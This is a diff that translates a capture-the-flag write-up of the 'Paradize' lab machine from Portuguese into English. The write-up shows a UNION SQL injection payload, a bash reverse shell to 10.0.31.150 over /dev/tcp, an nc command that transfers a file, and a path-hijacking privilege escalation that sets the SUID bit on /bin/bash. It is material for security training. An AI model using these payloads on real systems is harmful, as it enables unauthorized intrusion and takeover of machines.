@@ -1,20 +1,14 @@
 ---
 title: 'Paradize Writeup'
 date: '2024-11-30'
-tags: ['SQLI', 'Linux']
+tags: ['SQLI', 'Linux', 'Hacking Club']
 draft: false
-summary: 'Na maquina paradize precisamos explorar um SQL injection para conseguirmos subir uma webshell e explorar uma falha de path hijacking.'
+summary: 'On the Paradize machine, we need to exploit an SQL injection to upload a webshell and explore a path hijacking vulnerability.'
 images: ['/static/images/paradize-writeup-images/default.png']
 authors: ['default']
 ---
 
 ![logo](/static/images/paradize-writeup-images/default.png)
-
-## **Plataforma**: Hacking Club
-
-### **Dificuldade:** Easy
-
-### **Nome**: Paradize
 
 ---
 
@@ -36,7 +30,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Somente as portas 22 (SSH) e 80 (HTTP) estão abertas.
+Only ports 22 (SSH) and 80 (HTTP) are open.
 
 ---
 
@@ -50,45 +44,45 @@ Somente as portas 22 (SSH) e 80 (HTTP) estão abertas.
 
 ![paradize 1](/static/images/paradize-writeup-images/image1.png)
 
-Acessando a aplicação
+Accessing the application
 
 `http://paradize.hc`
 
 ![paradize 2](/static/images/paradize-writeup-images/image2.png)
 
-Registrando um novo usuário
+Registering a new user
 
 ![paradize 3](/static/images/paradize-writeup-images/image3.png)
 
-Aparentemente o campo de login/register não são vulneráveis a SQL Injection (Aspas simples não funcionou).
+Apparently, the login/register fields are not vulnerable to SQL Injection (single quotes did not work).
 
-Após logarmos, temos uma funcionalidade de ‘Change Passord’.
+After logging in, we have a 'Change Password' functionality.
 
 ![paradize 4](/static/images/paradize-writeup-images/image4.png)
 
-Ao passar uma aspas simples, a aplicação retorna um erro do banco de dados, indicando um possível SQL Injection
+By inserting a single quote, the application returns a database error, indicating a potential SQL Injection vulnerability.
 
 ![paradize 5](/static/images/paradize-writeup-images/image5.png)
 
 ![paradize 6](/static/images/paradize-writeup-images/image6.png)
 
-Capturei a requisição no Burp para facilitar a exploração.
+I captured the request in Burp to facilitate exploitation.
 
-O próximo passo é explorar o SQL Injection, começamos enumerando o numero de colunas presente no banco de dados.
+The next step is to exploit the SQL Injection, starting by enumerating the number of columns in the database.
 
 `' UNION SELECT 1 #`
 
 ![paradize 7](/static/images/paradize-writeup-images/image7.png)
 
-Existem 3 colunas nesse banco de dados, pois a aplicação não exibiu um erro.
+There are 3 columns in this database since the application did not show an error.
 
 `' UNION SELECT 1,2,3 #`
 
 ![paradize 8](/static/images/paradize-writeup-images/image8.png)
 
-O próximo passo é utilizar o SQL Injection pra injetar uma web-shell em um arquivo com a função `into outfile` do MySQL.
+The next step is to use the SQL Injection to inject a web shell into a file using the MySQL `into outfile` function.
 
-Para identificar um diretório com permissões de escrita, podemos utilizar o modo `recursion` do `ffuf`
+To identify a directory with write permissions, we can use the `ffuf` tool in recursion mode.
 
 ### Fuzzing
 
@@ -108,7 +102,7 @@ Para identificar um diretório com permissões de escrita, podemos utilizar o mo
 
 `bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'`
 
-OBS: Lembre de encodar a payload.
+NOTE: Remember to encode the payload.
 
 ![paradize 12](/static/images/paradize-writeup-images/image12.png)
 
@@ -124,33 +118,33 @@ OBS: Lembre de encodar a payload.
 
 ![paradize 14](/static/images/paradize-writeup-images/image14.png)
 
-Executando o binário pra ver o que ele faz
+Running the binary to see what it does
 
 ![paradize 15](/static/images/paradize-writeup-images/image15.png)
 
-Transferindo ele pra nossa maquina, para analisar melhor
+Transferring it to our machine for further analysis
 
 ```jsx
 #kali
 nc -lnvp 8000 >enrollment
-#alvo
+#target
 nc 10.0.31.150 8000 < /usr/sbin/enrollment
 ```
 
 ![paradize 16](/static/images/paradize-writeup-images/image16.png)
 
-Analisando o binário no **Ghidra** , podemos ver que ele chama o comando `system` pra executar o programa `figlet` .
+Analyzing the binary in **Ghidra**, we can see it calls the system command to run the `figlet` program.
 
 ![paradize 17](/static/images/paradize-writeup-images/image17.png)
 
-No Linux, os arquivos são executados em uma ordem especifica, sabendo disso podemos criar um arquivo chamado `figlet` malicioso que se será executado antes pelo binário `enrollment` utilizando a técnica de **Path Hijacking**.
+In Linux, files are executed in a specific order. Knowing this, we can create a malicious **figlet** file that will be executed first by the **enrollment** binary using the Path Hijacking technique.
 
 ```bash
-www-data@ip-172-16-7-123:/tmp$ echo '#!/bin/bash' > figlet
-www-data@ip-172-16-7-123:/tmp$ echo 'chmod u+s /bin/bash' >> figlet
-www-data@ip-172-16-7-123:/tmp$ chmod 777 figlet
-www-data@ip-172-16-7-123:/tmp$ export PATH=$(pwd):$PATH
-www-data@ip-172-16-7-123:/tmp$ /usr/sbin/enrollment
+echo '#!/bin/bash' > figlet
+echo 'chmod u+s /bin/bash' >> figlet
+chmod 777 figlet
+export PATH=$(pwd):$PATH
+/usr/sbin/enrollment
 
 ```
 
